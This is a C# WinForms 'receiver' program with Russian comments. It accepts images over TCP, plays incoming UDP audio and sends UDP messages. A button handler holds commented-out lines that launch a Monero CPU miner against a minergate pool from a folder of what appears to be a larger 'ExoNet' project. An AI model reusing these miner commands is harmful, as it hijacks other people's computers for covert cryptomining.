using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.Net.Sockets;
using System.Net;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using NAudio.Wave;
using NAudio.CoreAudioApi;

namespace receiver
{

    public partial class Form1 : Form
    {

        private TcpListener tcpListener;
        private int y;

        public delegate void AddImage(PictureBox pictureBox);
        public AddImage addImage;

        //Подключены ли мы
        private bool connected;
        //сокет отправитель
        Socket client;
        //поток для нашей речи
        WaveIn input;
        //поток для речи собеседника
        WaveOut output;
        //буфферный поток для передачи через сеть
        BufferedWaveProvider bufferStream;
        //поток для прослушивания входящих сообщений
        Thread in_thread;
        //сокет для приема (протокол UDP)
        Socket listeningSocket;

        public Form1()
        {
            InitializeComponent();
            IPAddress ipAd = IPAddress.Any;
            IPAddress ipAddress = IPAddress.Parse("127.0.0.1");
            tcpListener = new TcpListener(IPAddress.Any, 12001);
            tcpListener.Start();

            this.addImage = this.AddImageMethod;
            Thread th = new Thread(this.ReciveImage);
            th.Start();

            //создаем поток для записи нашей речи
            input = new WaveIn();
            //определяем его формат - частота дискретизации 8000 Гц, ширина сэмпла - 16 бит, 1 канал - моно
            input.WaveFormat = new WaveFormat(8000, 16, 1);
            //добавляем код обработки нашего голоса, поступающего на микрофон
           // input.DataAvailable += Voice_Input;
            //создаем поток для прослушивания входящего звука
            output = new WaveOut();
            //создаем поток для буферного потока и определяем у него такой же формат как и потока с микрофона
            bufferStream = new BufferedWaveProvider(new WaveFormat(8000, 16, 1));
            //привязываем поток входящего звука к буферному потоку
            output.Init(bufferStream);
            //сокет для отправки звука
            client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            connected = true;
            listeningSocket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            //создаем поток для прослушивания
            in_thread = new Thread(new ThreadStart(Listening));
            //запускаем его
            in_thread.Start();
        }
        /*private void Voice_Input(object sender, WaveInEventArgs e)
        {
            try
            {
                //Подключаемся к удаленному адресу
                IPEndPoint remote_point = new IPEndPoint(IPAddress.Parse(textBox1.Text), 5555);
                //посылаем байты, полученные с микрофона на удаленный адрес
                client.SendTo(e.Buffer, remote_point);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }*/
        //Прослушивание входящих подключений
        private void Listening()
        {
            //Прослушиваем по адресу
            IPEndPoint localIP = new IPEndPoint(IPAddress.Any, 5555);
            listeningSocket.Bind(localIP);
            //начинаем воспроизводить входящий звук
            output.Play();
            //адрес, с которого пришли данные
            EndPoint remoteIp = new IPEndPoint(IPAddress.Any, 0);
            //бесконечный цикл
            while (connected == true)
            {
                try
                {
                    //промежуточный буфер
                    byte[] data = new byte[65535];
                    //получено данных
                    int received = listeningSocket.ReceiveFrom(data, ref remoteIp);
                    //добавляем данные в буфер, откуда output будет воспроизводить звук
                    bufferStream.AddSamples(data, 0, received);
                }
                catch (SocketException ex)
                { }
            }
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            connected = false;
            listeningSocket.Close();
            listeningSocket.Dispose();

            client.Close();
            client.Dispose();
            if (output != null)
            {
                output.Stop();
                output.Dispose();
                output = null;
            }
            if (input != null)
            {
                input.Dispose();
                input = null;
            }
            bufferStream = null;
        }

    


        private void ReciveImage()
        {
            TcpClient tcpClient = null;
            do
            {
                
                try
                { 
                    tcpClient = tcpListener.AcceptTcpClient();
                }
                catch
                { 
                    return;
                }

                try
                {

                    Stream stream;
                    stream = null;
                    stream= tcpClient.GetStream();
                    pictureBox1.Image = new Bitmap(stream);
                    //ne testil
                //    pictureBox1.Size = PictureBoxSizeMode.StretchImage;
                    //ne testil
                 //   pictureBox.Location = new Point(this.y);
                 //   pictureBox.Size = pictureBox.Image.Size;
                 //   this.y += pictureBox.Size.Height;
                    //this.Invoke(null);
                    this.Invoke(this.addImage, pictureBox1);
                    tcpClient.Close();
                }
                catch (Exception ex)
                { 
                    MessageBox.Show(ex.Message);
                }
      /*          finally
                {
                    if (tcpClient != null)
                        tcpClient.Close();
                }*/
            } 
            while (true);

        }

        public void AddImageMethod(PictureBox pictureBox)
        {
            this.Controls.Add(pictureBox);
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
     //       this.FormClosed -= Form1_FormClosed;
            this.tcpListener.Stop();
        }
        //


        //принятие сообщения

      //  UdpClient udp = new UdpClient(22);
        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                // Отправка сообщения
                UdpClient udp = new UdpClient();

                // Указываем адрес отправки сообщения
                IPAddress ipaddress = IPAddress.Parse(textBox1.Text);
                IPEndPoint ipendpoint = new IPEndPoint(ipaddress, Convert.ToInt32(textBox2.Text));

                // Формирование оправляемого сообщения и его отправка.
                byte[] message = Encoding.Default.GetBytes(textBox3.Text);
                int sended = udp.Send(message, message.Length, ipendpoint);
                textBox3.Text = "";
                MessageBox.Show("Вопрос задан");
                // После окончания попытки отправки закрываем UDP соединение,
                // и освобождаем занятые объектом UdpClient ресурсы.
                udp.Close();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Location = new Point(0,0);
            int X = Screen.PrimaryScreen.Bounds.Width;
            int Y = Screen.PrimaryScreen.Bounds.Height -40;
            this.Width = X;
            this.Height = Y;
       //     this.TopMost = true;
            pictureBox1.Size= new Size(X-210,Y);
        }


        private void button2_Click_1(object sender, EventArgs e)
        {
            /*
            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            using (Graphics gr = Graphics.FromImage(bmp))
            {
                gr.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y,0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            }
                pictureBox1.Image = bmp;*/
       //     char a = '\\';
            //Process.Start("C:" + a + "Users" + a + "ALEXEY" + a + "Desktop" + a + "ExoNet - Full Source" + a + "miner" + a + "minerCPU" + a + "NsCpuCNMiner64.exe", "-o stratum+tcp://xmr.pool.minergate.com:45560 -u mkone100@yandex.ru -p x -dbg -1");
       //     Process.Start("C:" + a + "1" +a+ "NsCpuCNMiner64.exe", "-o stratum+tcp://xmr.pool.minergate.com:45560 -u mkone100@yandex.ru -p x -dbg -1");
         //   MessageBox.Show(Application.ExecutablePath.ToString()); //@"C:\test\sandbox.jar"
            MessageBox.Show(Application.StartupPath); //@"C:\test\sandbox.jar"
        }
        
    }
}
